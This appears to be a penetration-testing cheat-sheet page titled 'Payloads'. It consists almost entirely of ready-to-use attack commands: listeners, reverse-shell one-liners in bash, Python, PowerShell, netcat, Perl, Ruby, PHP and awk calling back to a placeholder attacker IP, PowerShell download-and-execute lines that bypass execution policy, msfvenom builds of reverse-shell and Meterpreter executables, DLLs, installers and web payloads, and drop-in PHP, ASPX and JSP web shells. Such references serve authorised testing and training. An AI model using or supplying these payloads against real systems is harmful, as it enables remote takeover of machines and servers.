---
title: Payloads
subtitle: PAYLOADS

sidebar:
  - label: LISTENERS
    items:
      - id: listeners
        text: "Listeners"
      - id: stabilise
        text: "Stabilise Shell"
  - label: SHELLS
    items:
      - id: bash-shells
        text: "Bash / Sh"
      - id: python-shells
        text: "Python"
      - id: powershell-shells
        text: "PowerShell"
      - id: netcat-shells
        text: "Netcat"
      - id: other-shells
        text: "Other"
  - label: MSFVENOM
    items:
      - id: msf-linux
        text: "Linux"
      - id: msf-windows
        text: "Windows"
      - id: msf-web
        text: "Web Shells"
  - label: WEB SHELLS
    items:
      - id: webshells
        text: "Manual Web Shells"
---

## LISTENERS
<!-- id: listeners -->

### Setting up listeners

#### nc | Basic listener
```
nc -nvlp <PORT>
```

#### rlwrap | With readline support (arrow keys, history)
```
rlwrap nc -nvlp <PORT>
```

#### socat | Fully interactive listener
```
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
```

#### socat | Connect back (on target)
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR_IP>:<PORT>
```


## STABILISE SHELL
<!-- id: stabilise -->

### TTY upgrade techniques

#### python3 | Spawn PTY then fix terminal
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

#### script | Alternative PTY spawn
```
script /dev/null -c bash
```

#### socat | Fully stable from the start (requires socat on target)
```
# On attacker — listener:
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR_IP>:<PORT>
```


## BASH / SH SHELLS
<!-- id: bash-shells -->

### One-liners

#### bash | Standard bash reverse shell
```
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
```

#### bash | Bash redirect variant
```
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'
```

#### sh | /bin/sh variant
```
/bin/sh -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
```

#### bash | URL-encoded (for web exploits)
```
bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/<YOUR_IP>/<PORT>%200>%261%27
```


## PYTHON SHELLS
<!-- id: python-shells -->

### Python reverse shells

#### python3 | Full reverse shell
```
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### python3 | PTY shell (better)
```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<YOUR_IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

#### python2 | Legacy systems
```
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```


## POWERSHELL SHELLS
<!-- id: powershell-shells -->

### PowerShell reverse shells

#### PowerShell | Standard reverse shell
```
powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object Net.Sockets.TCPClient('<YOUR_IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$r=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($r,0,$r.Length);$s.Flush()};$c.Close()"
```

#### PowerShell | Download and exec in memory
```
IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>:<PORT>/shell.ps1')
```

#### PowerShell | Bypass execution policy
```
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>:<PORT>/shell.ps1')"
```


## NETCAT SHELLS
<!-- id: netcat-shells -->

### Netcat variants

#### nc | With -e flag (traditional)
```
nc -e /bin/sh <YOUR_IP> <PORT>
```

#### nc | Without -e flag (mkfifo)
```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <YOUR_IP> <PORT> > /tmp/f
```

#### nc | Windows variant
```
nc.exe -e cmd.exe <YOUR_IP> <PORT>
```

#### ncat | With --exec (nmap's ncat)
```
ncat <YOUR_IP> <PORT> --exec /bin/bash
```


## OTHER SHELLS
<!-- id: other-shells -->

### Perl / Ruby / PHP one-liners

#### perl | Perl reverse shell
```
perl -e 'use Socket;$i="<YOUR_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### ruby | Ruby reverse shell
```
ruby -rsocket -e 'f=TCPSocket.open("<YOUR_IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### php | PHP reverse shell (cli)
```
php -r '$sock=fsockopen("<YOUR_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### awk | AWK reverse shell
```
awk 'BEGIN {s = "/inet/tcp/0/<YOUR_IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```


## LINUX PAYLOADS (MSFVENOM)
<!-- id: msf-linux -->

### Linux msfvenom payloads

#### msfvenom | ELF reverse shell (x64)
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f elf -o shell.elf
chmod +x shell.elf
```

#### msfvenom | ELF Meterpreter (x64)
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f elf -o meter.elf
```

#### msfvenom | Shared library (.so)
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f so -o shell.so
```


## WINDOWS PAYLOADS (MSFVENOM)
<!-- id: msf-windows -->

### Windows msfvenom payloads

#### msfvenom | EXE reverse shell (x64)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f exe -o shell.exe
```

#### msfvenom | EXE Meterpreter (x64)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f exe -o meter.exe
```

#### msfvenom | DLL reverse shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f dll -o shell.dll
```

#### msfvenom | PowerShell (ps1)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f psh -o shell.ps1
```

#### msfvenom | MSI installer
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```


## WEB PAYLOADS (MSFVENOM)
<!-- id: msf-web -->

### Web msfvenom payloads

#### msfvenom | PHP reverse shell
```
msfvenom -p php/reverse_php LHOST=<YOUR_IP> LPORT=<PORT> -f raw -o shell.php
```

#### msfvenom | ASP reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f asp -o shell.asp
```

#### msfvenom | ASPX reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f aspx -o shell.aspx
```

#### msfvenom | JSP reverse shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f raw -o shell.jsp
```

#### msfvenom | WAR reverse shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f war -o shell.war
```


## MANUAL WEB SHELLS
<!-- id: webshells -->

### Simple web shells (drop and use)

#### php | Simple command web shell
```
<?php system($_GET['cmd']); ?>
# Usage: http://<TARGET>/shell.php?cmd=whoami
```

#### php | More featured web shell
```
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

#### aspx | ASPX web shell
```
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>
```

#### jsp | JSP web shell
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
